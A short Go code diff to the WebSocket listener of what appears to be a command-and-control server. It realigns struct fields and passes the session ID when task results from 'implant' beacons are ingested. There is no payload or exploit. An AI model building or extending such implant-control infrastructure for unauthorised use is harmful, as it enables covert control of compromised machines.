@@ -36,10 +36,10 @@ type WebSocketListener struct {
 	srv      *http.Server
 	upgrader websocket.Upgrader
 
-	mu       sync.Mutex
-	conns    map[string]*wsConn // session_id → 连接
-	stopped  bool
-	stopCh   chan struct{}
+	mu      sync.Mutex
+	conns   map[string]*wsConn // session_id → 连接
+	stopped bool
+	stopCh  chan struct{}
 }
 
 // wsConn 单个 WS implant 的内存状态
@@ -212,7 +212,7 @@ func (l *WebSocketListener) handleConn(ws *websocket.Conn) {
 		case "result":
 			var report TaskResultReport
 			if err := json.Unmarshal(body, &report); err == nil {
-				_ = l.manager.IngestTaskResult(report)
+				_ = l.manager.IngestTaskResultForSession(session.ID, report)
 			}
 		case "checkin":
 			// 心跳更新：beacon 周期性送上心跳
